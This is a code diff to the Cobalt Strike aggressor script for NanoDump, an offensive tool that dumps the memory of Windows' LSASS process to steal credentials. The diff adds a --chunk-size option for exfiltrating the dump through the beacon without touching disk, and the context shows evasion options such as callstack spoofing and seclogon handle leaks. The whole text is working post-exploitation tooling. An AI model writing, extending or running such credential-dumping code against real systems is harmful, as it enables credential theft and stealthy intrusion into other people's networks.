@@ -76,6 +76,8 @@ Avoid opening a handle with high privileges:\
 Miscellaneous:\
     --getpid\
             print the PID of LSASS and leave\
+    --chunk-size\
+            chunk size in KiB used to exfiltrate the dump without touching disk (default 900)\
 Help:\
     --help, -h\
             print this help message and leave");
@@ -142,6 +144,8 @@ alias nanodump {
     $elevate_handle = 0;
     # by default, dont use handle duplication and elevation
     $duplicate_elevate = 0;
+    # by default, the chunk size is 900 KiB
+    $chunk_size = 0xe1000;
     for ($i = 1; $i < size(@_); $i++)
     {
         if (@_[$i] eq "--getpid")
@@ -259,6 +263,24 @@ alias nanodump {
         else if (@_[$i] eq "--spoof-callstack" || @_[$i] eq "-sc")
         {
             $spoof_callstack = 1;
+        }
+        else if (@_[$i] eq "--chunk-size")
+        {
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --chunk-size value");
+                return;
+            }
+            # set the size of the chunk
+            $chunk_size = @_[$i];
+            if(!-isnumber $chunk_size || $chunk_size eq "0")
+            {
+                berror($1, "Invalid chunk size: " . $chunk_size);
+                return;
+            }
+            # from KiB to bytes
+            $chunk_size = int($chunk_size) * 1024;
         }
         else if (@_[$i] eq "--help" || @_[$i] eq "-h")
         {
@@ -470,7 +492,7 @@ alias nanodump {
     }
 
     # pack the arguments
-    $args = bof_pack($1, "iziiiiiiiiiiziiizi", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $elevate_handle, $duplicate_elevate, $get_pid, $use_seclogon_leak_local, $use_seclogon_leak_remote, $seclogon_leak_remote_binary, $use_seclogon_duplicate, $spoof_callstack, $use_silent_process_exit, $silent_process_exit, $use_lsass_shtinkering);
+    $args = bof_pack($1, "iziiiiiiiiiiiziiizi", $pid, $dump_path, $write_file, $chunk_size, $use_valid_sig, $fork, $snapshot, $dup, $elevate_handle, $duplicate_elevate, $get_pid, $use_seclogon_leak_local, $use_seclogon_leak_remote, $seclogon_leak_remote_binary, $use_seclogon_duplicate, $spoof_callstack, $use_silent_process_exit, $silent_process_exit, $use_lsass_shtinkering);
 
     # run
     btask($1, "Running NanoDump BOF");
